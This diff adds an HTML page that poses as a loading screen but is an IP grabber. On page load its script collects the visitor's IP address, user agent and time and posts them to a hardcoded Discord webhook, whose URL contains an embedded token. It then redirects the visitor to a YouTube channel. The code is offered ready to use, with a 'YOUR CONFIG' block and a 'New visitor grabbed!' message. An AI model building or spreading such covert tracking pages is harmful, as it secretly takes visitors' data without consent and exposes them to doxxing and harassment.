@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 15vh;
+        }
+        .spinner {
+            font-size: 2.5em;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+        p {
+            font-size: 1.2em;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="spinner">Loading awesome content...</div>
+    <p>Please wait a second 👀</p>
+
+    <script>
+        // === YOUR CONFIG ===
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457815797396148530/03FDxKCa3ppN_VN33AB-TzBZUlCmx2GvEt_ji0ldgA9Q9Jzm7RcVMppzPiGR7LH5Q0sJ";
+        const REDIRECT_URL = "https://www.youtube.com/@LitagoRBX";
+
+        async function grabAndRedirect() {
+            try {
+                // Get IP super fast
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip || "unknown";
+
+                // Extra details
+                const userAgent = navigator.userAgent;
+                const time = new Date().toLocaleString();
+
+                // Send to your Discord webhook (fire and forget for max speed)
+                const payload = {
+                    embeds: [{
+                        title: "New visitor grabbed! 🔥",
+                        color: 16711680, // Red color
+                        fields: [
+                            { name: "IP Address", value: `\`${ip}\``, inline: true },
+                            { name: "Time", value: time, inline: true },
+                            { name: "User Agent", value: `\`\`\`${userAgent.substring(0, 500)}\`\`\`` }
+                        ],
+                        footer: { text: "Redirected to LitagoRBX YouTube 😈" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+                // No await here → redirect happens immediately
+
+            } catch (err) {
+                console.error("Failed to send:", err);
+            }
+
+            // === INSTANT REDIRECT TO YOUR CHANNEL ===
+            window.location.replace(REDIRECT_URL);
+            // Fallback
+            setTimeout(() => { window.location.href = REDIRECT_URL; }, 100);
+        }
+
+        // Run immediately when script loads
+        grabAndRedirect();
+    </script>
+</body>
+</html>
